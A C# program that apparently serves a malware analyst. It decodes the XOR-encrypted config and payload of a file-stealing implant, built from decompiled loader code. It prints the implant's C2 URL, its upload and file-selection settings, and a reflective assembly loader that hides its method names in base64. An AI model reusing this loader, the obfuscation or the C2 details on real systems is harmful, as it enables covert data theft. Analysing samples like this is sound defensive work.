using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;


namespace ConsoleApplication1
{
    class Program
    {
       


        static void Main(string[] args)
        {

            //loadConfig();
            loadSystemAppDll();
        }


        private static void loadConfig()
        {
            // Right here we will load config 
            string configPaht = "C:\\ProgramData\\AtlasFiles2.1\\Atlas2.1";

            byte[] allData = File.ReadAllBytes(configPaht);
            using(MemoryStream memoryStream = new MemoryStream(DecodeData(allData)))
            {
                ReadFrom(new BinaryReader(memoryStream));
            }

            

        }

        private static byte[] DecodeData(byte[] data)
        {
            byte[] array = new byte[data.Length - 32];
            Buffer.BlockCopy(data, 32, array, 0, array.Length);
            for (int i = 0; i < array.Length; i++)
            {
                byte[] array2 = array;
                int num = i;
                array2[num] ^= data[i % 32];
            }
            return array;
        }

        public static  void ReadFrom(BinaryReader bR)
        {

             // Token: 0x04000005 RID: 5
            int _getInterval;

            // Token: 0x04000006 RID: 6
            int _postInterval;

            // Token: 0x04000007 RID: 7
            bool _doSysInfo;

            // Token: 0x04000008 RID: 8
            bool _doFileSelection;

            // Token: 0x04000009 RID: 9
            bool _doFileUpload;

            // Token: 0x0400000A RID: 10
            string[] _selectFileExtensions;

            // Token: 0x0400000B RID: 11
            int _maxSelectFileSize;

            // Token: 0x0400000C RID: 12
            List<Program.File1> _selectedFiles;

            // Token: 0x0400000D RID: 13
            List<Program.File1> _outputFiles;

            string decodeString = "";
     
            if (bR.ReadByte() == 1)
            {
                string _settingsFilePath = Environment.ExpandEnvironmentVariables(bR.ReadString());
                //Console.WriteLine("_settingsFilePath :" + _settingsFilePath);
                decodeString += "_settingsFilePath :" + _settingsFilePath + "\r\n";
                string directoryName = Path.GetDirectoryName(_settingsFilePath);
                if (!Directory.Exists(directoryName))
                {
                    Directory.CreateDirectory(directoryName);
                }
                string _outputFolder = Environment.ExpandEnvironmentVariables(bR.ReadString());
                //Console.WriteLine("_outputFolder: "+ _outputFolder);
                decodeString += "_outputFolder: " + _outputFolder + "\r\n";
                if (!Directory.Exists(_outputFolder))
                {
                    Directory.CreateDirectory(_outputFolder);
                }
                string text = bR.ReadString();
                //Console.WriteLine("serverUrl "+ text);
                decodeString += "config serverUrl " + text + "\r\n";
               Uri _serverUri = null;
                if (string.IsNullOrEmpty(text))
                {
                    _serverUri = new Uri("https://cdn-gov.net/202/FLStfe17Y895dzDR25Gsrdzou8FqKk2HaPBg8yOA/38246/1867/610df322".Trim());
                }
                else
                {
                    _serverUri = new Uri(text);
                }

                //Console.WriteLine("avaliable _serverUri: "+ _serverUri.ToString());
                decodeString += "avaliable _serverUri: " + _serverUri.ToString() + "\r\n";
                _getInterval = bR.ReadInt32();
                _postInterval = bR.ReadInt32();

                _doSysInfo = bR.ReadBoolean();
                _doFileSelection = bR.ReadBoolean();
                _doFileUpload = bR.ReadBoolean();

                //Console.WriteLine("_getInterval: "+ _getInterval+ " \n_postInterval: "+_postInterval+ " \n _doSysInfo: "+ _doSysInfo
                //    + " \n_doFileSelection:"+ _doFileSelection+ " \n_doFileUpload: "+ _doFileUpload);

                decodeString += "_getInterval: " + _getInterval + " \n_postInterval: " + _postInterval + " \n _doSysInfo: " + _doSysInfo
                    + " \n_doFileSelection:" + _doFileSelection + " \n_doFileUpload: " + _doFileUpload + "\r\n";
               int num = bR.ReadInt32();
                _selectFileExtensions = new string[num];
                decodeString += "_selectFileExtensions total:" + num + "\r\n";
                for (int i = 0; i < num; i++)
                {
                    _selectFileExtensions[i] = bR.ReadString();
                    //Console.WriteLine("_selectFileExtensions["+i+"] --> " + _selectFileExtensions[i]);
                    decodeString += "_selectFileExtensions[" + i + "] --> " + _selectFileExtensions[i] + "\n";
                }
                decodeString += "\r\n";
                _maxSelectFileSize = bR.ReadInt32();
                decodeString += "_maxSelectFileSize: " + _maxSelectFileSize + "\r\n";
                int num2 = bR.ReadInt32();
                _selectedFiles = new List<Program.File1>(num2);
                //Console.WriteLine("_selectedFiles num: "+ num2);

                decodeString += "_selectedFiles num: " + num2 + "\r\n";

                for (int j = 0; j < num2; j++)
                {
                    Program.File1 file = new Program.File1(bR);
                    //Console.WriteLine("_selectedFiles["+j+"] "+file.FilePath);
                    decodeString += "_selectedFiles[" + j + "] " + file.FilePath + "\n";
                    _selectedFiles.Add(file);
                }
                decodeString += "\r\n";
                int num3 = bR.ReadInt32();
                _outputFiles = new List<Program.File1>(num3);
                //Console.WriteLine("_outputFiles num3 "+ num3);

                decodeString += ("_outputFiles total " + num3 + "\r\n");
                for (int k = 0; k < num3; k++)
                {
                    Program.File1 file = new Program.File1(bR);
                    //Console.WriteLine("_outputFiles[" + k + "] " + file.FilePath);
                    decodeString += "_outputFiles[" + k + "] " + file.FilePath + "\n";

                   _outputFiles.Add(file);
                }

                using (StreamWriter sw = new StreamWriter("C:\\Users\\QWER\\Desktop\\file.hta\\decode.txt"))
                {
                    sw.WriteLine(decodeString);
                    sw.WriteLine("\n");

                    Console.WriteLine("Decode succ!");
                }
               
                

                    return;
            }
            // throw new InvalidDataException();
            Console.WriteLine("--> Nothing to read");
        }


            //----------------
        public class File1
        {
            // Token: 0x0600003B RID: 59 RVA: 0x00004463 File Offset: 0x00002663
            public File1(string filePath)
            {
                this._filePath = filePath;
            }

            // Token: 0x0600003C RID: 60 RVA: 0x00004472 File Offset: 0x00002672
            public File1(BinaryReader bR)
            {
                this._filePath = bR.ReadString();
                this._sentOffset = bR.ReadInt64();
                this._complete = bR.ReadBoolean();
            }

            // Token: 0x0600003D RID: 61 RVA: 0x0000449E File Offset: 0x0000269E
            public void WriteTo(BinaryWriter bW)
            {
                bW.Write(this._filePath);
                bW.Write(this._sentOffset);
                bW.Write(this._complete);
            }

            // Token: 0x0600003E RID: 62 RVA: 0x000044C4 File Offset: 0x000026C4
            public override bool Equals(object obj)
            {
                if (obj == null)
                {
                    return false;
                }
                if (obj == this)
                {
                    return true;
                }
                Program.File1 file = obj as Program.File1;
                return file != null && this._filePath == file._filePath;
            }

            // Token: 0x0600003F RID: 63 RVA: 0x000044F9 File Offset: 0x000026F9
            public override int GetHashCode()
            {
                return this._filePath.GetHashCode();
            }

            // Token: 0x17000010 RID: 16
            // (get) Token: 0x06000040 RID: 64 RVA: 0x00004506 File Offset: 0x00002706
            public string FilePath
            {
                get
                {
                    return this._filePath;
                }
            }

            // Token: 0x17000011 RID: 17
            // (get) Token: 0x06000041 RID: 65 RVA: 0x0000450E File Offset: 0x0000270E
            // (set) Token: 0x06000042 RID: 66 RVA: 0x00004516 File Offset: 0x00002716
            public long SentOffset
            {
                get
                {
                    return this._sentOffset;
                }
                set
                {
                    this._sentOffset = value;
                }
            }

            // Token: 0x17000012 RID: 18
            // (get) Token: 0x06000043 RID: 67 RVA: 0x0000451F File Offset: 0x0000271F
            // (set) Token: 0x06000044 RID: 68 RVA: 0x00004527 File Offset: 0x00002727
            public bool Complete
            {
                get
                {
                    return this._complete;
                }
                set
                {
                    this._complete = value;
                }
            }

            // Token: 0x04000024 RID: 36
            private string _filePath;

            // Token: 0x04000025 RID: 37
            private long _sentOffset;

            // Token: 0x04000026 RID: 38
            private bool _complete;
        }
        //----------------

        private static void loadSystemAppDll()
        {
            byte[] array = DataImplementationStructureInstance("C:\\ProgramData\\AtlasFiles2.1\\j9W3O2M.tmp         ");
            byte[] array2 = new byte[array.Length - 32];
            DecoratorImplementationRestoreAlter(ref array, 32, ref array2, array2.Length);
            for (int i = 0; i < array2.Length; i++)
            {
                byte[] array3 = array2;
                int num = i;
                array3[num] ^= array[i % 32];
            }
            //ObserverStateRestrictedFacade(array2);
            SaveFile(array2);
        }

        private static byte[] DataImplementationStructureInstance(string StrategySingleObserverStructure)
        {
            return File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), StrategySingleObserverStructure.Trim()));
        }


        // Token: 0x06000003 RID: 3 RVA: 0x00002091 File Offset: 0x00000491
        private static Assembly ObserverStateRestrictedFacade(byte[] FacadeNullGetRestricted)
        {

            // Right her
            return Assembly.Load(FacadeNullGetRestricted);
        }

        private static void SaveFile(byte[] FacadeNullGetRestricted)
        {

            string path = "C:\\ProgramData\\AtlasFiles2.1\\New folder\\payload.dll";
            try
            {
                BinaryWriter bw = new BinaryWriter(new FileStream(path,FileMode.Create));
                bw.Write(FacadeNullGetRestricted);
                bw.Close();
                Console.WriteLine("Save file succ");
            }

            catch (IOException e) {
                Console.WriteLine("save file error "+e.ToString());
            }

            // Right her
            //return Assembly.Load(FacadeNullGetRestricted);
        }
        // Token: 0x06000004 RID: 4 RVA: 0x00002108 File Offset: 0x00000508
        private static void DecoratorImplementationRestoreAlter(ref byte[] ChainDeferMediatorRestricted, int StateIteratorIteratorGet, ref byte[] ImplementationRestoreShareDecorator, int SingleStateRestrictedSequential)
        {
            for (int i = StateIteratorIteratorGet; i < SingleStateRestrictedSequential; i++)
            {
                ImplementationRestoreShareDecorator[i - StateIteratorIteratorGet] = ChainDeferMediatorRestricted[i];
            }
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002099 File Offset: 0x00000499
        public static void Gadgets()
        {
            GetPutRestrictedDecorator();
        }

        // Token: 0x06000006 RID: 6 RVA: 0x00002099 File Offset: 0x00000499
        public static void InitGadgets()
        {
            GetPutRestrictedDecorator();
        }

        // Token: 0x06000007 RID: 7 RVA: 0x00002099 File Offset: 0x00000499
        public static void FileRipper()
        {
            GetPutRestrictedDecorator();
        }

        // Token: 0x06000008 RID: 8 RVA: 0x0000212C File Offset: 0x0000052C
        private static void GetPutRestrictedDecorator()
        {
            try
            {
                foreach (Type type in CompositeDecoratorMediatorStructure.GetExportedTypes())
                {
                    if (type.Name == Encoding.ASCII.GetString(Convert.FromBase64String("UHJvZ3JhbQ==")))
                    {
                        object obj = Activator.CreateInstance(type);
                        obj.GetType().GetMethod(Encoding.ASCII.GetString(Convert.FromBase64String("U3RhcnQ="))).Invoke(obj, new object[0]);
                        break;
                    }
                }
            }
            catch
            {
            }
            finally
            {
                Process.GetCurrentProcess().Kill();
            }
        }

        // Token: 0x04000001 RID: 1
        private static readonly Assembly CompositeDecoratorMediatorStructure;
    }


}
